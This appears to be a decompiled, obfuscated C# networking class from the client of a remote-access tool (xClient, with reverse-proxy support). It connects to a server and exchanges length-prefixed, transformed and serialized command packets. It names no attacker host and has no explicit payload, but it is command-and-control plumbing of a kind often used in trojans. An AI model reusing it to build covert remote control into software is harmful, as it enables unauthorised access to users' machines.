using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;

public class GClass33
{
	public delegate void GDelegate3(GClass33 s, Exception ex);

	public delegate void GDelegate4(GClass33 s, bool connected);

	public delegate void GDelegate5(GClass33 s, GInterface4 packet);

	public delegate void GDelegate6(GClass33 s, GInterface4 packet, long length, byte[] rawData);

	public enum GEnum8
	{
		const_0,
		const_1
	}

	[CompilerGenerated]
	private sealed class Class27
	{
		public int int_0;

		internal bool method_0(GClass1 t)
		{
			return t.ConnectionId == int_0;
		}
	}

	[CompilerGenerated]
	private GDelegate3 gdelegate3_0;

	[CompilerGenerated]
	private GDelegate4 gdelegate4_0;

	[CompilerGenerated]
	private GDelegate5 gdelegate5_0;

	[CompilerGenerated]
	private GDelegate6 gdelegate6_0;

	private Socket socket_0;

	private List<GClass1> list_0;

	private readonly object object_0 = new object();

	private byte[] byte_0;

	private byte[] byte_1;

	private readonly Queue<byte[]> queue_0 = new Queue<byte[]>();

	private bool bool_0;

	private readonly object object_1 = new object();

	private readonly Queue<byte[]> queue_1 = new Queue<byte[]>();

	private bool bool_1;

	private readonly object object_2 = new object();

	private byte[] byte_2;

	private bool bool_2;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private GEnum8 genum8_0;

	[CompilerGenerated]
	private bool bool_3;

	[CompilerGenerated]
	private Serializer serializer_0;

	private const bool bool_4 = true;

	private const bool bool_5 = true;

	public int BUFFER_SIZE => 16384;

	public uint KEEP_ALIVE_TIME => 25000u;

	public uint KEEP_ALIVE_INTERVAL => 25000u;

	public int HEADER_SIZE => 4;

	public int MAX_PACKET_SIZE => 5242880;

	public GClass1[] ProxyClients
	{
		get
		{
			lock (object_0)
			{
				return list_0.ToArray();
			}
		}
	}

	public bool Connected
	{
		[CompilerGenerated]
		get
		{
			return bool_3;
		}
		[CompilerGenerated]
		private set
		{
			bool_3 = value;
		}
	}

	protected Serializer Serializer
	{
		[CompilerGenerated]
		get
		{
			return serializer_0;
		}
		[CompilerGenerated]
		set
		{
			serializer_0 = value;
		}
	}

	public event GDelegate3 Event_0
	{
		[CompilerGenerated]
		add
		{
			GDelegate3 gDelegate = gdelegate3_0;
			GDelegate3 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate3 value2 = (GDelegate3)Delegate.Combine(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate3_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
		[CompilerGenerated]
		remove
		{
			GDelegate3 gDelegate = gdelegate3_0;
			GDelegate3 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate3 value2 = (GDelegate3)Delegate.Remove(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate3_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
	}

	public event GDelegate4 Event_1
	{
		[CompilerGenerated]
		add
		{
			GDelegate4 gDelegate = gdelegate4_0;
			GDelegate4 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate4 value2 = (GDelegate4)Delegate.Combine(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate4_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
		[CompilerGenerated]
		remove
		{
			GDelegate4 gDelegate = gdelegate4_0;
			GDelegate4 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate4 value2 = (GDelegate4)Delegate.Remove(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate4_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
	}

	public event GDelegate5 Event_2
	{
		[CompilerGenerated]
		add
		{
			GDelegate5 gDelegate = gdelegate5_0;
			GDelegate5 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate5 value2 = (GDelegate5)Delegate.Combine(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate5_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
		[CompilerGenerated]
		remove
		{
			GDelegate5 gDelegate = gdelegate5_0;
			GDelegate5 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate5 value2 = (GDelegate5)Delegate.Remove(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate5_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
	}

	public event GDelegate6 Event_3
	{
		[CompilerGenerated]
		add
		{
			GDelegate6 gDelegate = gdelegate6_0;
			GDelegate6 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate6 value2 = (GDelegate6)Delegate.Combine(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate6_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
		[CompilerGenerated]
		remove
		{
			GDelegate6 gDelegate = gdelegate6_0;
			GDelegate6 gDelegate2;
			do
			{
				gDelegate2 = gDelegate;
				GDelegate6 value2 = (GDelegate6)Delegate.Remove(gDelegate2, value);
				gDelegate = Interlocked.CompareExchange(ref gdelegate6_0, value2, gDelegate2);
			}
			while ((object)gDelegate != gDelegate2);
		}
	}

	private void method_0(Exception ex)
	{
		gdelegate3_0?.Invoke(this, ex);
	}

	private void method_1(bool connected)
	{
		if (Connected != connected)
		{
			Connected = connected;
			gdelegate4_0?.Invoke(this, connected);
		}
	}

	private void method_2(GInterface4 packet)
	{
		gdelegate5_0?.Invoke(this, packet);
	}

	private void method_3(GInterface4 packet, long length, byte[] rawData)
	{
		gdelegate6_0?.Invoke(this, packet, length, rawData);
	}

	protected GClass33()
	{
		list_0 = new List<GClass1>();
		byte_0 = new byte[BUFFER_SIZE];
		byte_2 = new byte[HEADER_SIZE];
	}

	protected void method_4(IPAddress ip, ushort port)
	{
		try
		{
			method_12();
			socket_0 = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			socket_0.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
			socket_0.Connect(ip, port);
			if (socket_0.Connected)
			{
				socket_0.BeginReceive(byte_0, 0, byte_0.Length, SocketFlags.None, method_5, null);
				method_1(connected: true);
			}
		}
		catch (Exception ex)
		{
			method_0(ex);
		}
	}

	private void method_5(IAsyncResult result)
	{
		int num;
		try
		{
			num = socket_0.EndReceive(result);
			if (num <= 0)
			{
				throw new Exception("no bytes transferred");
			}
		}
		catch (NullReferenceException)
		{
			return;
		}
		catch (ObjectDisposedException)
		{
			return;
		}
		catch (Exception)
		{
			method_12();
			return;
		}
		byte[] array = new byte[num];
		try
		{
			Array.Copy(byte_0, array, array.Length);
		}
		catch (Exception ex4)
		{
			method_0(ex4);
			return;
		}
		lock (queue_1)
		{
			queue_1.Enqueue(array);
		}
		lock (object_2)
		{
			if (!bool_1)
			{
				bool_1 = true;
				ThreadPool.QueueUserWorkItem(method_6);
			}
		}
		try
		{
			socket_0.BeginReceive(byte_0, 0, byte_0.Length, SocketFlags.None, method_5, null);
		}
		catch (ObjectDisposedException)
		{
		}
		catch (Exception ex6)
		{
			method_0(ex6);
		}
	}

	private void method_6(object state)
	{
		while (true)
		{
			byte[] array;
			lock (queue_1)
			{
				if (queue_1.Count == 0)
				{
					lock (object_2)
					{
						bool_1 = false;
						break;
					}
				}
				array = queue_1.Dequeue();
			}
			int_3 += array.Length;
			bool flag = true;
			while (flag)
			{
				int num;
				switch (genum8_0)
				{
				case GEnum8.const_1:
				{
					if (byte_1 == null || byte_1.Length != int_4)
					{
						byte_1 = new byte[int_4];
					}
					int num2 = ((int_1 + int_3 >= int_4) ? (int_4 - int_1) : int_3);
					try
					{
						Array.Copy(array, int_0, byte_1, int_1, num2);
					}
					catch (Exception ex4)
					{
						flag = false;
						method_0(ex4);
						break;
					}
					int_1 += num2;
					int_0 += num2;
					int_3 -= num2;
					if (int_1 == int_4)
					{
						bool flag2;
						if (!(flag2 = byte_1.Length == 0))
						{
							byte_1 = GClass30.smethod_7(byte_1);
							flag2 = byte_1.Length == 0;
						}
						if (!flag2)
						{
							try
							{
								byte_1 = GClass32.smethod_6(byte_1);
							}
							catch (Exception)
							{
								flag = false;
								method_12();
								break;
							}
							flag2 = byte_1.Length == 0;
						}
						if (flag2)
						{
							flag = false;
							method_12();
							break;
						}
						using (MemoryStream stream = new MemoryStream(byte_1))
						{
							try
							{
								GInterface4 packet = (GInterface4)Serializer.Deserialize(stream);
								method_2(packet);
							}
							catch (Exception ex6)
							{
								flag = false;
								method_0(ex6);
								break;
							}
						}
						genum8_0 = GEnum8.const_0;
						byte_1 = null;
						int_4 = 0;
						int_1 = 0;
					}
					if (int_3 == 0)
					{
						flag = false;
					}
					break;
				}
				case GEnum8.const_0:
					{
						if (int_3 + int_2 >= HEADER_SIZE)
						{
							num = (bool_2 ? (HEADER_SIZE - int_2) : HEADER_SIZE);
							try
							{
								if (bool_2)
								{
									try
									{
										Array.Copy(array, int_0, byte_2, int_2, num);
									}
									catch (Exception ex)
									{
										flag = false;
										method_0(ex);
										goto end_IL_026d;
									}
									int_4 = BitConverter.ToInt32(byte_2, 0);
									int_2 = 0;
									bool_2 = false;
								}
								else
								{
									int_4 = BitConverter.ToInt32(array, int_0);
								}
								if (int_4 <= 0 || int_4 > MAX_PACKET_SIZE)
								{
									throw new Exception("invalid header");
								}
								goto IL_0308;
								end_IL_026d:;
							}
							catch (Exception)
							{
								flag = false;
								method_12();
							}
						}
						else
						{
							try
							{
								Array.Copy(array, int_0, byte_2, int_2, int_3);
							}
							catch (Exception ex3)
							{
								flag = false;
								method_0(ex3);
								break;
							}
							int_2 += int_3;
							bool_2 = true;
							flag = false;
						}
						break;
					}
					IL_0308:
					int_3 -= num;
					int_0 += num;
					genum8_0 = GEnum8.const_1;
					break;
				}
			}
			if (genum8_0 == GEnum8.const_0)
			{
				int_1 = 0;
			}
			int_0 = 0;
			int_3 = 0;
		}
	}

	public void method_7<T>(T packet) where T : GInterface4
	{
		if (!Connected || packet == null)
		{
			return;
		}
		lock (queue_0)
		{
			using MemoryStream memoryStream = new MemoryStream();
			try
			{
				Serializer.Serialize(memoryStream, packet);
			}
			catch (Exception ex)
			{
				method_0(ex);
				return;
			}
			byte[] array = memoryStream.ToArray();
			queue_0.Enqueue(array);
			method_3(packet, array.LongLength, array);
			lock (object_1)
			{
				if (bool_0)
				{
					return;
				}
				bool_0 = true;
			}
			ThreadPool.QueueUserWorkItem(method_9);
		}
	}

	public void method_8<T>(T packet) where T : GInterface4
	{
		method_7(packet);
		while (bool_0)
		{
			Thread.Sleep(10);
		}
	}

	private void method_9(object state)
	{
		while (Connected)
		{
			byte[] payload;
			lock (queue_0)
			{
				if (queue_0.Count == 0)
				{
					method_11();
					return;
				}
				payload = queue_0.Dequeue();
			}
			try
			{
				socket_0.Send(method_10(payload));
			}
			catch (Exception ex)
			{
				method_0(ex);
				method_11(clear: true);
				return;
			}
		}
		method_11(clear: true);
	}

	private byte[] method_10(byte[] payload)
	{
		payload = GClass32.smethod_4(payload);
		payload = GClass30.smethod_4(payload);
		byte[] array = new byte[payload.Length + HEADER_SIZE];
		Array.Copy(BitConverter.GetBytes(payload.Length), array, HEADER_SIZE);
		Array.Copy(payload, 0, array, HEADER_SIZE, payload.Length);
		return array;
	}

	private void method_11(bool clear = false)
	{
		lock (object_1)
		{
			bool_0 = false;
		}
		if (!clear)
		{
			return;
		}
		lock (queue_0)
		{
			queue_0.Clear();
		}
	}

	public void method_12()
	{
		if (socket_0 != null)
		{
			socket_0.Close();
			socket_0 = null;
			int_0 = 0;
			int_1 = 0;
			int_2 = 0;
			int_3 = 0;
			int_4 = 0;
			byte_1 = null;
			genum8_0 = GEnum8.const_0;
			if (list_0 != null)
			{
				lock (object_0)
				{
					try
					{
						foreach (GClass1 item in list_0)
						{
							item.method_2();
						}
					}
					catch (Exception)
					{
					}
				}
			}
			if (GClass57.unsafeStreamCodec_0 != null)
			{
				GClass57.unsafeStreamCodec_0.Dispose();
				GClass57.unsafeStreamCodec_0 = null;
			}
		}
		method_1(connected: false);
	}

	public void method_13(ReverseProxyConnect command)
	{
		lock (object_0)
		{
			list_0.Add(new GClass1(command, this));
		}
	}

	public GClass1 method_14(int connectionId)
	{
		lock (object_0)
		{
			return list_0.FirstOrDefault((GClass1 t) => t.ConnectionId == connectionId);
		}
	}

	public void method_15(int connectionId)
	{
		try
		{
			lock (object_0)
			{
				int num = 0;
				while (true)
				{
					if (num < list_0.Count)
					{
						if (list_0[num].ConnectionId == connectionId)
						{
							break;
						}
						num++;
						continue;
					}
					return;
				}
				list_0.RemoveAt(num);
			}
		}
		catch
		{
		}
	}
}
